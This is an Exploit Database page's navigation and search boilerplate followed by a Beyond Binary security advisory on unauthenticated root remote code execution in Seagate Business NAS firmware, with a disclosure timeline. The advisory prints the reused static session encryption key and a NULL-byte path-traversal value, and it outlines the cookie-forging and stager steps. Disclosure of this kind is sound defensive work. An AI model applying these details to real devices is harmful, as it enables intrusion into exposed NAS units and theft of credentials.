| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from beyondbinary.io_77cf7451_20250124_134344.html ===

[![](/images/beyond-binary-logo.png)](/)

* [home](/)
* [about](/about/)
* [services](/services/)
* [articles](/articles/)
* [contact](/contact/)
* [media](/media/)

![](/images/sticky-morph.png)

## Articles & News

1 March 2015
# Advisory: Seagate NAS Remote Code Execution Vulnerability

[Advisory](/tags/advisory/)
[CVE](/tags/cve/)
[Exploit](/tags/exploit/)
[Seagate](/tags/seagate/)
## Overview

[Seagate](http://www.seagate.com/) is a well-known vendor of hardware solutions, with products available worldwide. Its line of [NAS](https://en.wikipedia.org/wiki/Network-attached_storage) products targeted at businesses is called [Business Storage 2-Bay NAS](http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-2-bay-nas/). These can be found inside home and business networks, and in many cases they are publicly exposed.

Products in this line that run firmware versions up to and including version 2014.00319 were found to be vulnerable to a number of issues that allow for remote code execution under the context of the root user. These vulnerabilities are exploitable without requiring any form of authorisation on the device.

## Updates

This document was updated on 11th June 2015 to include links to the released firmware that attempts to address the issues in this advisory.

## Vulnerability Details

Seagate Business NAS products come with a web-enabled management application. This application lets administrators perform the usual device configuration functions, such as adding users, setting up access control, managing files, and more.

The web application is built with the following core technologies:

* PHP version 5.2.13 ([Released 25th February 2010](http://php.net/releases/5_2_13.php))
* CodeIgniter 2.1.0 ([Released 23rd November 2011](https://github.com/bcit-ci/CodeIgniter/releases/tag/v2.1.0))
* Lighttpd 1.4.28 ([Released 22nd August 2010](http://redmine.lighttpd.net/projects/lighttpd/wiki/Release-1_4_28))

All three of these technologies are clearly out of date, and the listed versions of PHP and CodeIgniter are known to have security issues. On top of these technologies sits a custom PHP application, which itself contains a number of security-related issues. Details of each key issue are listed below.

### PHP 5.2.3

Versions of PHP prior to 5.3.4 allow users to specify file paths that include a NULL byte ([CVE-2006-7243](http://www.cvedetails.com/cve/CVE-2006-7243/)). This issue allows user-controlled data to prematurely terminate file paths, allowing for full control over the file extension.

This issue is regularly abused to include unintended files in PHP source code via functions such as `require()` and `include()`.

### CodeIgniter 2.1.0

Versions of CodeIgniter prior to 2.2.0 create session tokens that are made up of a serialised PHP associative array (hash) that has been encrypted using a custom algorithm. This PHP hash contains user-controllable data, which makes it possible for users to [extract the encryption key](https://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/) and decrypt the content of the cookie ([CVE-2014-8686](https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability)). Once decrypted, users can modify the content of the cookie and re-encrypt it prior to submitting it back to the server, resulting in other potential attack vectors including PHP object injection.

A unique encryption key value should be used for each installation of a CodeIgniter application. However, in the case of this line of NAS products, the encryption key that is used is exactly the same for every instance ([CVE-2014-8687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8687)).

### Custom web application

The custom web application does not appear to maintain session-related information on the web server side. All of the information relevant to a user session is stored inside the session cookie prior to it being encrypted and sent to the browser. The PHP hash inside the cookie contains a number of key/value entries, including the following:

* `username`: this is a string value that represents the name of the user in the current session.
* `is_admin`: this is a string value that can be set to `yes` or `no`, and indicates whether the current user is an administrator on the NAS.
* `language`: this is a string value that represents the current user’s chosen language (eg. `en_US`).

Once a session has been established and the `username` field is present in the cookie, the system does no further validation of user credentials. This means that if a user can manipulate this value directly, instead of attempting to log in the standard way, they can bypass the login mechanism completely.

Direct modification (or addition) of the `is_admin` value allows a user to self-elevate to administrative privileges in the web application itself.

The fact that a static session encryption key is in use across all instances of the NAS means that once a user has a valid session cookie on one instance, they can apply that same cookie directly to another instance and acquire the same level of access. In short, once a user is logged in as `admin` on one instance, they’re effectively `admin` on every instance.

The `language` parameter is used to generate a file path that is referenced in the web application PHP code via a call to `include()`. Manipulation of this parameter allows for exploitation of a local file inclusion vulnerability.

Finally, the web application is being served by an instance of Lighttpd that is running under the context of the `root` user. Hence, any successful exploitation results in activities being conducted as `root`.

## Affected versions

Two versions of the NAS firmware were tested and shown to be vulnerable. Those versions were:

* 2014.00319
* 2013.60311

At the time of writing, it is believed that all versions prior to 2014.00319 are highly likely to contain the same vulnerabilities.

## CVE Identifiers

This advisory makes use of prior work referenced in the following CVEs:

* [CVE-2014-8684](http://seclists.org/fulldisclosure/2014/May/54): timing attacks and object injection.
* [CVE-2014-8686](https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability): a fall-back to the `_xor_encode()` method of session encryption.

The vulnerability discovered via the reuse of the session cookie encryption key was allocated the identifier [CVE-2014-8687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8687) by MITRE.

## Exploitation

It is simple to exploit the issues listed above to gain arbitrary code execution on the device as the `root` user. The key steps required to achieve this are:

* The attacker must write PHP code to the file system on the NAS. This can be done in several ways, including:
  1. HTTP access log file poisoning via the `User-Agent` header.
  2. HTTP error log file poisoning via the `Host` header.
  3. Modifying the device description in the web application interface. This writes user-controlled strings to a file located at `/etc/devicedesc`, however it does require administrative rights.
  4. Uploading of files to a file share that the device has exposed.
* The attacker must then manipulate the content of the `language` variable in the session cookie so that it contains the path to the attacker-controlled PHP on the file system. The NULL byte flaw in PHP must be used at the end of this value to force PHP to ignore any characters that are appended to the file path by the web application.
* The attacker then makes a request with the manipulated cookie, resulting in code execution as `root`.

Beyond Binary has produced a Metasploit module and a standalone Python script that automate the process of exploitation. Each of these scripts take the following approach:

1. Connects to the target NAS and extracts a `ci_session` cookie.
2. Decrypts the cookie using the static encryption key of `0f0a000d02011f0248000d290d0b0b0e03010e07` and extracts the PHP hash.
3. Modifies the serialised PHP hash so that the `username` is set to `admin` and the `is_admin` field is set to `yes`.
4. Encrypts this updated PHP hash ready for further use as a `ci_session` cookie. This cookie now allows future requests to operate on the NAS as if they were an administrator.
5. Performs a request to extract the host configuration, which includes the device’s description.
6. Modifies the host configuration so that the device description contains a small stager payload.
7. Performs a request to update the host configuration with the new data so that the stager payload is written to `/etc/devicedesc`.
8. Modifies the PHP hash again so that the `language` parameter contains the value `../../../../etc/devicedesc\x00` (note the NULL byte at the end).
9. Encrypts this new PHP hash ready for future use as a `ci_session` cookie.
10. Performs a request to the NAS using the cookie created in the previous step. This invokes the stager that was written to disk. This request posts a larger payload which is written to disk under the web server root.
11. Performs another request which then resets the host configuration back to what it was prior to exploitation.

From here, the final stage of the exploit is on-disk and ready to be executed. In the case of the Metasploit module, the final stage is a self-deleting file that contains whichever payload was chosen by the user. In the case of the standalone Python script, the final stage is a simple web shell which is continually referenced for each executed command, and is removed when the Python script is closed.

The exploits are available for download here:

* [Metasploit module](/exploits/bbsec001/seagate_nas_php_exec_noauth.rb) (or on [Github](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/seagate_nas_php_exec_noauth.rb)).
* [Python script](/exploits/bbsec001/seagate_nas_php_exec_noauth.py) (or on [Exploit DB](http://www.exploit-db.com/exploits/36202/)).

The following image shows a sample run of the Metasploit module:

![Metasploit module sample run](/images/bbsec001/msf-sample-run.png)

## Remediation

At the time of writing there is no firmware version available for download that contains fixes for the issues listed in this advisory. It is recommended that consumers of these Seagate Business NAS products (and other products using vulnerable firmware) ensure that devices are not accessible via the public Internet. For internal use, it is recommended that the devices be located behind a firewall configured to allow only a trusted set of IP addresses to connect to the web interface.

**Edit: 11th June 2015**

During April 2015 Seagate released [firmware](http://www.seagate.com/au/en/support/downloads/item/business-nas-4bay-firmware-master-dl/) that attempts to resolve these issues. Please see the timeline below.

## Exposure

At the time of writing, [Shodan](https://www.shodan.io/) reports that there are over 2,500 publicly exposed devices on the Internet that are likely to be vulnerable.

## Potential Ramifications

It appears that the NAS products do not integrate with the likes of Active Directory or LDAP. As a result, they need to store passwords for any users that require access. Passwords are hashed using DES and stored in the `/etc/shadow` file.

Instances of the NAS housed inside an organisation are likely to contain passwords that are reused by domain users. The DES hashes are very easy to crack, and hence an attacker could easily acquire domain credentials once the NAS has been compromised.

## Notes

Initial attempts to disclose the above issues to the vendor proved time consuming and unproductive. Staff on the front-line support team repeatedly failed to direct the query to the relevant point of contact. In light of this, a direct security contact was identified using open intelligence, and front-line support was bypassed. This employee handled the query professionally and demonstrated a high level of concern in the early stages.

## Timeline

* **07th October 2014**
  + Initial bug discovery.
* **08th October 2014**
  + Simple Proof of Concept exploit created.
* **16th October 2014**
  + Enhanced exploit created.
* **18th October 2014**
  + Contacted vendor via website, requested PGP for secure communications.
  + Contacted MITRE to discuss potential CVE identifier allocation.
* **20th October 2014**
  + Contacted vendor via Twitter, requested PGP for secure communications.
  + Vendor responded via email, requested disclosure via non-encrypted channels.
* **22nd October 2014**
  + Contacted vendor via email, disclosed all details of the issues found.
  + Beyond Binary established 100 day public disclosure period ending on 30th January 2015.
* **23rd October 2014**
  + Vendor responded, confirmed receipt, requested 24 hours to confirm issues.
* **23rd October 2014**
  + Vendor responded, requested firmware version in use. Suggested using latest firmware.
  + Contacted vendor via email, informed them that all firmware versions are vulnerable.
* **27th October 2014**
  + Vendor responded via email, indicated work will be done without further communication.
  + Contacted vendor via email, requested updates on progress.
* **02nd November 2014**
  + Contacted vendor via email, requested confirmation of receipt of previous email.
  + Vendor responded, indicated communications will remain open.
* **09th November 2014**
  + MITRE responded with thorough email about prior work, and CVE allocation.
* **17th November 2014**
  + Contacted vendor via email, requested status update.
* **02nd December 2014**
  + Contacted vendor again via email, requested status update.
* **16th December 2014**
  + Contacted vendor again via Twitter, requested status update.
  + Vendor responded again, email content was the same as what was received 27th October 2014.
  + Contacted vendor via email, requested a more thorough update.
* **17th December 2014**
  + Vendor responded, requested confirmation of firmware version and asked if SSH is enabled.
* **19th December 2014**
  + Contacted vendor, informed them that use of SSH is irrelevant, as is the firmware version.
* **01st January 2015**
  + Contacted a number of vendor employees via Linked In.
* **09th January 2015**
  + Established contact with vendor employee responsible for security after interaction with a security professional on Twitter.
  + Established secure communications with employee using PGP.
* **10th January 2015**
  + Second vendor employee responded via Linked In, confirmed receipt of message and indicated knowledge of contact with previous employee. Previous employee will continue handling disclosure.
* **10th-16th January 2015**
  + Various communications back-and-forth with employee.
* **16th January 2015**
  + Disclosure documentation rewritten and sent with exploit to employee PGP-encrypted.
* **17th January 2015**
  + Employee confirmed receipt.
  + Beyond Binary revised public disclosure date to 1st March 2015.
* **21st January 2015**
  + Contacted employee, requested update.
* **23rd January 2015**
  + Employee responded, indicated successful exploitation using Proof of Concept code.
* **30th January 2015**
  + Employee proactively established contact and provided an update.
* **05th February 2015**
  + Employee again proactively established contact and provided an update.
* **17th February 2015**
  + Contacted employee to request status update for fixes and timeline for release.
* **26th February 2015**
  + Employee responded indicating there is no update to be shared.
* **01st March 2015**
  + Public disclosure.
* **April 2015 (day unknown)**
  + Seagate released [firmware version 2015.00322](http://www.seagate.com/au/en/support/downloads/item/business-nas-4bay-firmware-master-dl/) to address security issues ([release notes](http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-4-bay-nas/4-bay-release-notes-00319/)).

## Recent

15 March 2018
#### [TTP: Domain Fronting with Metasploit and Meterpreter](/articles/domain-fronting-with-metasploit-and-meterpreter/)

Though it isn't widely known, support for Domain Fronting was added to Metasploit and Meterpreter by OJ Reeves in late 2017. Part of the reason that it's not common knowledge is the lack of documentation or discussion around how to use it. As a result, we decided to create this post so that users of Metasploit have a decent guide on how to configure and use Domain Fronting over HTTPS with a legitimate certificate.

[Metasploit](/tags/metasploit/)
[TTP](/tags/ttp/)

01 August 2017
#### [TTP: Bypassing Symantec Email Security.cloud (MessageLabs)](/articles/bypassing-messagelabs/)

During a recent Attack Simulation against a high-profile client, Beyond Binary faced off against Symantec Email Security.cloud (formerly MessageLabs) whilst conducting a variety of phishing campaigns. This was not the first time we had come up against cloud-based email security services, however our usual approaches to bypassing them didn't yield any fruit.

[MessageLabs](/tags/messagelabs/)
[TTP](/tags/ttp/)

10 March 2015
#### [Opinion: Seagate's Analysis is Incorrect](/articles/seagate-nas-rce-response-analysis/)

On March 1st 2015 Beyond Binary went public with an advisory that disclosed 0day flaws in Seagate Business Storage 2-Bay NAS devices. Days later, Seagate responded to the advisory through a number of channels:

* A direct email to Beyond Binary

[Opinion](/tags/opinion/)
[Seagate](/tags/seagate/)

1 March 2015
#### [Advisory: Seagate NAS Remote Code Execution Vulnerability](/articles/seagate-nas-rce/)

Seagate is a well-known vendor of hardware solutions, with products available worldwide. Its line of NAS products targeted at businesses is called Business Storage 2-Bay NAS. These can be found inside home and business networks, and in many cases they are publicly exposed.

[Advisory](/tags/advisory/)
[CVE](/tags/cve/)
[Exploit](/tags/exploit/)
[Seagate](/tags/seagate/)

4 February 2015
#### [Advisory: TeamCity Account Creation](/articles/teamcity-account-creation/)

TeamCity is a multi-platform continuous integration and build server product created by JetBrains. It is used by many development organisations to automate the build and deployment of software solutions as part of the development process. TeamCity is a very popular product and hence the number of installations, both public and private, is quite high.

[Advisory](/tags/advisory/)
[CVE](/tags/cve/)
[Exploit](/tags/exploit/)
[TeamCity](/tags/teamcity/)

[View older articles](/articles/)

[![](/images/beyond-binary-logo.png)](/)

[01 August 2017:](https://twitter.com/BeyondBase2/status/892362430881214464)Some cloud-based email protection mechanisms are useful. But don’t rely on them, they can and will be bypassed without much effort!

---

* [home](/)
* [about](/about/)
* [services](/services/)
* [articles](/articles/)
* [contact](/contact/)
* [media](/media/)

© Beyond Binary Pty Ltd - ABN 64 146 311 962


